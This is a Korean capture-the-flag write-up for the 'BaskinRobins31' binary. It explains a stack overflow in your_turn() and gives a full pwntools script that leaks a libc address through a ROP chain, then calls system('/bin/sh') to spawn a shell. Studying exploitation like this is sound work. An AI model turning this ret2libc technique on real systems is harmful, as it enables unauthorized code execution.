# 문제
***

BaskinRobins31 바이너리의 checksec 결과는 다음과 같다. 
```
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
```

file 명령어의 결과는 다음과 같다.
```
BaskinRobins31: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=4abb416c74a16aaa8b4c9c6c366bed445c306037, not stripped
```

바이너리 코드

__main()__ 

```
int __cdecl main(int argc, const char ** argv, const char ** envp)
{
    ...
    v5 = 31;
    v6 = 0;
    
    while( (signed int)v5 > 0)
    {
        if(v6)
        {
            my_turn(&v5);
            v6 = 0;
        }
        else
        {
            v6 = (unsigned __int64)your_turn(&v5) != 0;
        }
        ...
    }
    if(v6)
    {
        puts("Wow! You win!");
        ...
    }
    ...
}
```

__your_turn()__
```
signed __int64 __fastcall your_turn(_DWORD *a1)
{
    char s; // [rbp-B0h]
    ...
    v4 = 0;
    memset(&s,0,0x96);
    ...
    n = read(0,&s,0x190);
    write(1,&s,n);
    putchar(10);
    v4 = strtoul(&s,0,10);
    if((unsigned int)check_decision(v4))
    {
        *a1 -= v4;
        result = 1;
    }
    else
    {
        ...
        result = 0;
    }
    return result;
}
```

__your_turn()__ 함수에 bof 취약점이 존재한다. <br/><br/>
ROP gadget을 이용해서 libc base address를 알아낸 뒤에 다시 __your_turn()__ 함수를 호출한다.<br/><br/>
그 다음에 다시 bof를 통해서 system 함수를 호출하는 ROP gadget을 구성하면 쉘을 딸 수 있다.


# 풀이
***
```
#!/usr/bin/python

from pwn import *

file_path="/home/sungyun/round3/baskinrobins31/BaskinRobins31"

libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")

p=process(file_path)

p.recvuntil("(1-3)\n")

puts_got=0x602020
puts_plt=0x4006c0
prdi=0x0000000000400bc3
your_turn=0x00000000004008a4

pay="A"*(0xb0+8)
pay+=p64(prdi)
pay+=p64(puts_got)
pay+=p64(puts_plt)
pay+=p64(your_turn)

p.send(pay)
p.recvuntil(":( \n")

puts=p.recvline()[::-1]
puts=puts[1:]
libc_base=int(puts.encode('hex'),16)-libc.symbols['puts']
system=libc_base+libc.symbols['system']
sh=libc_base+list(libc.search('/bin/sh\x00'))[0]

p.recvuntil("(1-3)\n")

pay2="A"*(0xb0+8)
pay2+=p64(prdi)
pay2+=p64(sh)
pay2+=p64(system)

p.send(pay2)
p.recvuntil(":( \n")

p.interactive()
```



